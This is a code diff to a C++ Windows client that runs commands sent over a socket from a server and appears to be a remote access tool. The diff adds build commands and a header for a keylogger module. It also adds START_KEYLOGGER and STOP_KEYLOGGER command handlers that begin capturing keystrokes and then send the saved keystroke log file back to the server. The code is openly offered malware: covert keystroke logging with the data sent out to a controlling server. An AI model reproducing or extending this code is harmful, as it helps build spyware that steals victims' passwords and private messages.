@@ -1,4 +1,5 @@
-// g++ -std=c++11 client.cpp .\modules\ss_module.cpp -o client -lws2_32 -lgdiplus -lgdi32 -lole32 -pthread
+// g++ -std=c++11 client.cpp .\modules\ss_module.cpp -o client -lws2_32 -lgdiplus -lgdi32 -lole32 -pthread OLD VERSION WITHOUT KEYLOGGER DELETE IF YOU WANT
+//g++ client.cpp .\modules\ss_module.cpp .\modules\keylogger\keylogger_module.cpp -o client.exe -lws2_32 -lgdiplus -lgdi32 -lole32
 
 // TO DO
 // move functions to the modules directory and minimize client.cpp
@@ -19,6 +20,7 @@
 // module headers
 #include <memory>
 #include "modules/ss_module.h"
+#include "modules/keylogger/keylogger_module.h"
 
 #ifdef _WIN32
 #include <winsock2.h>
@@ -49,6 +51,9 @@ std::string base64_encode(const std::vector<char>& data);
 bool send_message(SOCKET sock, const std::string& message);
 bool SendFileViaMsgpack(SOCKET sock, const char* filename);
 bool SendFileInChunks(SOCKET sock, const char* filename, const std::vector<char>& filedata);
+
+//Module declarations
+Keylogger_Module keylogger;
 
 // Simple msgpack message structure for server compatibility
 std::vector<char> create_message(const std::string& content) {
@@ -94,6 +99,7 @@ void signal_handler(int signal) {
     g_running = false; // Set the flag to false to stop main loop
 }
 
+// TODO: Implement this function to base module class to prevent writing the same code over and over.
 // Function to send a file over socket using msgpack protocol
 bool SendFileViaMsgpack(SOCKET sock, const char* filename) {
     // Open file in binary mode
@@ -284,10 +290,26 @@ void handle_command(const std::string& command, SOCKET sock) {
     else if (command == "START_KEYLOGGER") {
         std::cout << "[Action] Starting keylogger module..." << std::endl;
         // TODO: Implement keylogger start
+        try{
+            keylogger.run();
+        }
+        catch(const std::exception& e){
+            std::cerr << "[Error] Exception in keylogger handling: " << e.what() << std::endl;
+        }
+
     }
     else if (command == "STOP_KEYLOGGER") {
         std::cout << "[Action] Stopping keylogger..." << std::endl;
         // TODO: Implement keylogger stop
+        keylogger.stopKeylogger();
+        std::string& keylogFileName = keylogger.getKeylogFileName();
+        std::cout << "[Action] Keylogger stopped. File saved as: " << keylogFileName << std::endl;
+
+        if (keylogger.sendFileViaMsgPack(sock, keylogFileName)) {
+            std::cout << "[Success] Log file sent to server" << std::endl;
+        } else {
+            std::cout << "[Warning] Log file saved locally but failed to send" << std::endl;
+        }
     }
     else {
         std::cout << "[Action] Unknown command, echoing back: " << command << std::endl;
